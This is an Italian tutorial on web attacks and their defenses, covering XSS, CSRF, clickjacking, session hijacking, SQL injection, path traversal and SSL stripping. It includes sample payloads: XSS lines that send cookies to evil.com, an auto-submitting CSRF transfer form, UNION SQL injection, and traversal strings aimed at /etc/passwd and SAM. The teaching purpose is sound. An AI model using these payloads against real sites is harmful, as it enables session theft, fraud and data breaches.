# 02 — Attacchi Web: Meccanismi, Esempi e Difese

> 🎯 **Obiettivo**: Comprendere in dettaglio i meccanismi dei principali attacchi web, riconoscerli da esempi concreti con codice e URL, e conoscere le contromisure specifiche per ciascuno.

---

## 1. XSS — Cross-Site Scripting

### 1.1 Cos'è

L'**XSS** (Cross-Site Scripting) è una vulnerabilità che permette a un attaccante di **iniettare codice JavaScript malevolo** in una pagina web vista da altri utenti. Il browser della vittima esegue il codice iniettato nel contesto del sito vulnerabile, con accesso a cookie, localStorage e DOM della pagina.

> ⚠️ Il nome è fuorviante: non si tratta di scripting "tra siti" nel senso tradizionale, ma di iniezione di script in un sito fidato.

### 1.2 XSS Reflected (Riflesso)

**Meccanismo**:
1. Il sito ha un parametro GET che viene incluso direttamente nella risposta HTML senza sanificazione
2. L'attaccante costruisce un URL malevolo e lo invia alla vittima
3. La vittima clicca → il browser invia la richiesta → il server "riflette" il payload nell'HTML → il browser esegue lo script

**Esempio vulnerabile** — codice PHP:
```php
<?php
// VULNERABILE: inserisce $q direttamente nell'HTML
$q = $_GET['q'];
echo "<p>Hai cercato: $q</p>";
?>
```

**URL di attacco**:
```
https://sito.example.com/cerca?q=<script>alert('XSS!')</script>
```

**URL di attacco più pericoloso** (furto cookie):
```
https://sito.example.com/cerca?q=<script>new Image().src='https://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
```

**Cosa può fare l'attaccante**:
- Rubare il cookie di sessione e impersonare l'utente
- Reindirizzare l'utente a un sito di phishing
- Modificare il contenuto della pagina (defacement)
- Registrare i tasti premuti (keylogger)
- Eseguire azioni sul sito a nome dell'utente

**Caratteristica chiave**: il payload non è memorizzato → funziona solo se la vittima clicca sul link malevolo.

### 1.3 XSS Stored (Persistente)

**Meccanismo**:
1. L'attaccante inserisce il payload in un campo che viene salvato nel database (commento, nome utente, post del forum)
2. Il payload viene mostrato a tutti gli utenti che visitano la pagina
3. Il browser di ogni visitatore esegue lo script

**Esempio**: commento malevolo in un forum
```html
<!-- Commento inserito dall'attaccante -->
Ottimo articolo! <script>document.location='https://evil.com/phish?token='+document.cookie</script>
```

Ogni utente che legge i commenti esegue lo script. Se un amministratore visualizza la pagina, l'attaccante ottiene i cookie di admin.

> 🔴 **Molto più pericoloso di XSS Reflected** perché colpisce automaticamente tutti i visitatori senza bisogno che clicchino su un link.

### 1.4 XSS DOM-based

Il payload non passa mai dal server. La manipolazione avviene interamente nel browser tramite JavaScript che legge dati dall'URL (hash, fragment) e li inserisce nel DOM senza sanificazione.

```javascript
// Codice vulnerabile nel browser
document.getElementById('output').innerHTML = location.hash.substring(1);
```

URL di attacco: `https://sito.example.com/page#<img src=x onerror=alert(1)>`

### 1.5 Difese contro XSS

| Contromisura | Come funziona | Esempio |
|-------------|---------------|---------|
| **Output encoding** | Converte `<` in `&lt;`, `>` in `&gt;` prima di inserirli nell'HTML | `htmlspecialchars($input)` in PHP |
| **Content Security Policy (CSP)** | Whitelist di origini da cui caricare script | `Content-Security-Policy: script-src 'self'` |
| **HttpOnly cookie** | I cookie non sono accessibili via JavaScript | `Set-Cookie: session=abc; HttpOnly` |
| **Input validation** | Rifiuta input con caratteri sospetti | Regex whitelist sugli input |
| **Librerie di templating** | Escape automatico nelle viste (React, Angular) | JSX in React fa escape di default |

---

## 2. CSRF — Cross-Site Request Forgery

### 2.1 Meccanismo

Il **CSRF** sfrutta il fatto che il browser invia automaticamente i cookie di sessione con ogni richiesta al sito originale, anche se la richiesta parte da un altro sito.

**Scenario tipico**:
1. La vittima è loggata su `banca.it` (ha un cookie di sessione valido)
2. La vittima visita `evil.com` (inviato via email, link social, ecc.)
3. `evil.com` contiene un form nascosto che invia una richiesta a `banca.it`
4. Il browser della vittima invia la richiesta **con il cookie di sessione automaticamente**
5. `banca.it` vede una richiesta autenticata e la esegue

**Esempio — form nascosto su evil.com**:
```html
<!-- Pagina su evil.com, invisibile all'utente -->
<form id="csrf-attack" action="https://banca.it/trasferisci" method="POST">
  <input type="hidden" name="destinatario" value="attaccante@evil.com">
  <input type="hidden" name="importo" value="5000">
  <input type="hidden" name="valuta" value="EUR">
</form>
<script>
  // Il form viene inviato automaticamente al caricamento della pagina
  document.getElementById('csrf-attack').submit();
</script>
```

L'utente visita la pagina → il form viene inviato in background → `banca.it` esegue il trasferimento.

### 2.2 Differenza tra XSS e CSRF

| Caratteristica | XSS | CSRF |
|----------------|-----|------|
| Chi esegue il codice | Browser della vittima esegue **script** iniettato | Browser della vittima invia **richiesta** non voluta |
| Cosa sfrutta | Fiducia del browser nel sito vulnerabile | Fiducia del server nella sessione autenticata |
| Origine dell'attacco | Payload iniettato nel sito vittima | Richiesta generata da sito esterno |
| Obiettivo | Rubare dati, controllare il browser | Eseguire azioni (pagamenti, cambio password) |
| Serve che l'utente sia loggato? | Non necessariamente | Sì, indispensabile |

### 2.3 Difese contro CSRF

**Token anti-CSRF** (metodo principale):
1. Il server genera un token casuale e imprevedibile per ogni sessione
2. Il token viene inserito in ogni form come campo hidden
3. Alla ricezione della richiesta, il server verifica che il token corrisponda

```html
<form method="POST" action="/trasferisci">
  <input type="hidden" name="csrf_token" value="a8f3k9x2m1q7p4...">
  <input type="text" name="destinatario">
  <input type="number" name="importo">
  <button type="submit">Trasferisci</button>
</form>
```

Il sito `evil.com` non può conoscere il token → non può costruire una richiesta valida.

**SameSite Cookie**:
```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```
- `SameSite=Strict`: il cookie non viene mai inviato con richieste cross-site → CSRF impossibile

---

## 3. Clickjacking

### 3.1 Meccanismo

Il **Clickjacking** (o UI Redressing) inganna l'utente sovrapponendo una pagina invisibile/trasparente a una pagina legittima. L'utente pensa di cliccare su qualcosa di innocuo ma in realtà sta cliccando su un elemento di un altro sito.

**Esempio — HTML su evil.com**:
```html
<!DOCTYPE html>
<html>
<body>
  <!-- Pagina visibile all'utente: sembra un gioco innocuo -->
  <h1>Clicca qui per vincere un premio! 🎁</h1>
  <button style="position:absolute; top:100px; left:200px; z-index:1">
    CLICCA QUI!
  </button>

  <!-- iframe di Facebook "Metti Mi Piace" alla pagina dell'attaccante -->
  <!-- completamente trasparente, sovrapposto esattamente al pulsante sopra -->
  <iframe
    src="https://www.facebook.com/plugins/like.php?href=https://evil.com/bad-page"
    style="position:absolute; top:100px; left:200px;
           width:100px; height:30px;
           opacity:0.0001;   /* quasi invisibile */
           z-index:2">       <!-- sopra il pulsante finto -->
  </iframe>
</body>
</html>
```

L'utente clicca su "CLICCA QUI" ma in realtà sta cliccando sul pulsante "Mi piace" di Facebook per la pagina di evil.com.

### 3.2 Varianti più pericolose

- **Furto di credenziali**: l'iframe punta a un form di login in background, l'utente digita su un campo visibile che in realtà è sovrapposto al campo password
- **Autorizzazione transazioni**: l'iframe punta al pulsante "Conferma pagamento" di un sito bancario
- **Registrazione webcam/microfono**: l'iframe punta al prompt di autorizzazione del browser

### 3.3 Difese contro il Clickjacking

```http
X-Frame-Options: DENY
```
oppure (più moderno, con CSP):
```http
Content-Security-Policy: frame-ancestors 'none'
```

| Header | Valore | Effetto |
|--------|--------|---------|
| `X-Frame-Options` | `DENY` | Vieta di incorporare la pagina in qualsiasi frame |
| `X-Frame-Options` | `SAMEORIGIN` | Permette iframe solo dallo stesso dominio |
| `CSP` | `frame-ancestors 'none'` | Equivalente a DENY (più potente e granulare) |
| `CSP` | `frame-ancestors 'self'` | Equivalente a SAMEORIGIN |
| `CSP` | `frame-ancestors https://trusted.com` | Permette solo da un dominio specifico |

---

## 4. Session Hijacking

### 4.1 Cos'è la sessione HTTP

Poiché HTTP è stateless, l'autenticazione viene mantenuta tramite un **token di sessione** (session ID) salvato in un cookie. Il server associa il session ID all'utente autenticato. Chi possiede quel cookie può impersonare quell'utente.

### 4.2 Furto di Cookie tramite XSS

Il metodo più comune di Session Hijacking usa una vulnerabilità XSS per rubare il cookie:

```javascript
// Payload XSS che invia il cookie al server dell'attaccante
<script>
fetch('https://evil.com/steal?cookie=' + btoa(document.cookie));
</script>
```

**Prevenzione**: attributo `HttpOnly` sul cookie → il cookie non è accessibile via `document.cookie`
```http
Set-Cookie: sessionid=xyz; HttpOnly; Secure
```

### 4.3 Session Fixation

**Meccanismo**:
1. L'attaccante ottiene un session ID valido (es. visitando il sito)
2. L'attaccante "fissa" questo session ID nella sessione della vittima (via URL o cookie injection)
3. La vittima si autentica con quel session ID
4. Ora l'attaccante può usare lo stesso session ID, già autenticato

**Prevenzione**: il server deve **rigenerare il session ID** dopo ogni login con successo:
```php
// PHP — sicuro
session_start();
// ... verifica credenziali ...
session_regenerate_id(true); // genera un nuovo ID dopo il login
$_SESSION['user'] = $authenticated_user;
```

### 4.4 Sniffing del Cookie su HTTP

Su una connessione HTTP non cifrata, il cookie di sessione viaggia in chiaro e può essere intercettato con uno sniffer.

**Prevenzione**: attributo `Secure` sul cookie → il browser invia il cookie **solo su connessioni HTTPS**
```http
Set-Cookie: sessionid=xyz; Secure; HttpOnly; SameSite=Strict
```

---

## 5. SQL Injection via HTTP

### 5.1 Meccanismo

La **SQL Injection** sfrutta il fatto che i dati inviati dall'utente (parametri GET/POST) vengono inseriti direttamente in una query SQL senza sanificazione.

**URL vulnerabile**:
```
https://negozio.example.com/prodotto?id=42
```

**Codice PHP vulnerabile**:
```php
$id = $_GET['id'];
// VULNERABILE: concatenazione diretta nella query
$query = "SELECT * FROM prodotti WHERE id = $id";
$result = mysqli_query($conn, $query);
```

### 5.2 Payload di attacco

**Payload `' OR '1'='1'`** (in un campo testuale):
```sql
-- Query originale
SELECT * FROM users WHERE username='mario' AND password='secret'

-- Con injection: username = admin'--
SELECT * FROM users WHERE username='admin'--' AND password='...'
-- Il -- commenta il resto → la password viene ignorata!
```

**Payload `1 OR 1=1`** (in un parametro numerico):
```sql
-- Query originale
SELECT * FROM prodotti WHERE id=42

-- Con injection: id=1 OR 1=1
SELECT * FROM prodotti WHERE id=1 OR 1=1
-- Restituisce TUTTI i prodotti, inclusi quelli privati/riservati
```

**Payload di estrazione dati** (UNION-based):
```
https://negozio.example.com/prodotto?id=1 UNION SELECT username,password,3 FROM users--
```

### 5.3 Impatto

- Lettura di dati riservati (credenziali, carte di credito)
- Modifica/cancellazione del database
- Bypass dell'autenticazione
- In alcuni casi: esecuzione di comandi di sistema (via `xp_cmdshell` in SQL Server)

### 5.4 Difese contro SQL Injection

| Contromisura | Esempio |
|-------------|---------|
| **Prepared Statements** (parametrizzazione) | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);` |
| **Stored Procedures** | Logica SQL precompilata, l'input è sempre un parametro |
| **Validazione input** | Accettare solo interi per parametri numerici |
| **Principio del minimo privilegio** | L'utente DB dell'app ha solo SELECT, non DROP/DELETE |
| **WAF** | Blocca pattern SQL noti (soluzione aggiuntiva, non sostitutiva) |

---

## 6. Directory Traversal

### 6.1 Meccanismo

Il **Directory Traversal** (o Path Traversal) sfrutta parametri URL che indicano un file da leggere. Usando la sequenza `../` (salire di una directory) l'attaccante può uscire dalla directory web e accedere a file di sistema.

**URL vulnerabile**:
```
https://server.example.com/download?file=report2023.pdf
```

**Codice PHP vulnerabile**:
```php
$file = $_GET['file'];
// VULNERABILE: percorso non validato
readfile('/var/www/documenti/' . $file);
```

**Attacco**:
```
https://server.example.com/download?file=../../../../etc/passwd
```

**Path risultante**: `/var/www/documenti/../../../../etc/passwd` → `/etc/passwd`

### 6.2 Esempi su sistemi Windows

```
https://server.example.com/download?file=..\..\..\..\windows\system32\config\SAM
```

### 6.3 Encoding per bypassare filtri naïve

| Encoding | Significato |
|----------|------------|
| `%2e%2e%2f` | `../` (URL encoding) |
| `%252e%252e%252f` | `../` (doppio URL encoding) |
| `..%c0%af` | `../` (overlong UTF-8) |

### 6.4 Difese contro Directory Traversal

1. **Validazione e sanitizzazione del percorso**:
```php
// PHP sicuro
$file = basename($_GET['file']); // rimuove il percorso, mantiene solo il nome file
$allowed_dir = '/var/www/documenti/';
$full_path = realpath($allowed_dir . $file);

// Verifica che il path finale sia dentro la directory permessa
if (strpos($full_path, $allowed_dir) !== 0) {
    die('Accesso negato');
}
readfile($full_path);
```

2. **Whitelist di file**: accettare solo nomi file da una lista predefinita
3. **Sandboxing**: il processo web gira in un chroot jail o container

---

## 7. MITM e SSL Stripping

### 7.1 Man-in-the-Middle (MITM)

In una rete locale (es. Wi-Fi), l'attaccante può posizionarsi tra la vittima e il gateway usando tecniche come:
- **ARP Poisoning**: invia risposte ARP false che associano l'IP del gateway al MAC dell'attaccante
- **Rogue Access Point**: crea un hotspot Wi-Fi con lo stesso SSID della rete reale

Una volta in posizione MITM, l'attaccante può:
- Leggere tutto il traffico HTTP
- Iniettare contenuto nelle risposte HTTP
- Registrare credenziali, cookie, form data

### 7.2 SSL Stripping

Proposto da **Moxie Marlinspike** nel 2009, l'SSL Stripping è un attacco MITM che degrada la connessione da HTTPS a HTTP all'insaputa dell'utente.

**Come funziona**:
```
[Vittima] ←── HTTP ──→ [Attaccante MITM] ←── HTTPS ──→ [Server legittimo]
```

1. La vittima digita `example.com` nel browser (HTTP per default)
2. Il browser invia una richiesta HTTP a `example.com`
3. L'attaccante MITM **intercetta** la richiesta prima che arrivi al server
4. L'attaccante **apre una connessione HTTPS** con il server per conto della vittima
5. L'attaccante **risponde alla vittima in HTTP** (stripping del SSL)
6. Il browser della vittima vede una connessione HTTP normale — l'utente spesso non nota nulla

**Perché l'utente non se ne accorge?**
- L'utente guarda la pagina e sembra funzionare normalmente
- Il lucchetto HTTPS non c'è, ma molti utenti non lo notano
- Il contenuto della pagina è identico all'originale

### 7.3 HSTS come difesa contro SSL Stripping

Con **HSTS** (HTTP Strict Transport Security) attivo:
1. Il browser ricorda (per il periodo `max-age`) che deve usare SOLO HTTPS per quel dominio
2. Se arriva un redirect HTTP, il browser lo rifiuta
3. SSL Stripping diventa impossibile per i siti già visitati

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**HSTS Preload List**: lista di domini che i browser conoscono come HTTPS-only già prima della prima visita. Anche la prima connessione è protetta.

> ⚠️ HSTS non è efficace per la **prima** visita a un sito (bootstrap problem). L'HSTS Preload List risolve questo problema per i siti registrati.
